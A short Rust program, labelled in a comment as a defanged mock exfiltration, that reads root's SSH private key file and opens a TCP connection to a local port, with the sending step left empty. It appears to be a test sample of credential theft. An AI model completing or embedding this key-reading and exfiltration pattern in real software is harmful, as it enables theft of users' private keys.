use std::fs;
use std::net::TcpStream;

fn main() {
    if let Ok(key) = fs::read_to_string("/root/.ssh/id_rsa") {
        if let Ok(mut stream) = TcpStream::connect("127.0.0.1:9001") {
            // Defanged mock exfiltration
        }
    }
}
